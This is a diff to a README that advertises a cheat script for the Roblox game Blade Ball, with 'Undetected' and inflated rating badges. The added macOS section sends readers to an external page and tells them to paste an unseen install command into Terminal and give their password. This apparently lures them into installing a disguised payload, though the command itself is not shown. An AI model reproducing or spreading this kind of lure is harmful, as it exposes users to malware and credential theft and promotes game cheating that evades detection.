@@ -2,6 +2,7 @@
 
 [![Rating](https://img.shields.io/badge/Rating-4.9%2F5-brightgreen?style=for-the-badge)](https://laplaplaplas.github.io/download/)
 [![Downloads](https://img.shields.io/badge/Downloads-50K%2B-blue?style=for-the-badge)](https://laplaplaplas.github.io/download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
 [![Undetected](https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge)](https://laplaplaplas.github.io/download/)
 
 Welcome to the ultimate guide on the **blade ball script**, a game-changing tool designed for enthusiasts of the popular Roblox game Blade Ball. 🎮 This script elevates your gameplay by automating complex actions, allowing you to focus on strategy and fun rather than manual precision. Whether you're a beginner looking to level up or a seasoned player seeking an edge, this script offers seamless integration and powerful features. 🚀
@@ -216,6 +217,21 @@ Yes, through the config menu. Adjust sensitivities for personalized defense.
 
 ---
 
+
+---
+
+## 🍎 macOS Installation
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+
+1. Click the badge above to open the macOS installer page
+2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
+3. Paste the install command shown on the page and press Enter
+4. Follow the prompts — installs automatically 🍏
+
+> Works on **Apple Silicon (M1–M4)** and **Intel Macs**. macOS may prompt for your password during install.
+
+---
 ## 🏁 Conclusion
 
 In summary, this script revolutionizes Blade Ball gameplay with its array of automations and user-centric design. From auto parry to all swords, it offers tools that cater to every need. 🌟
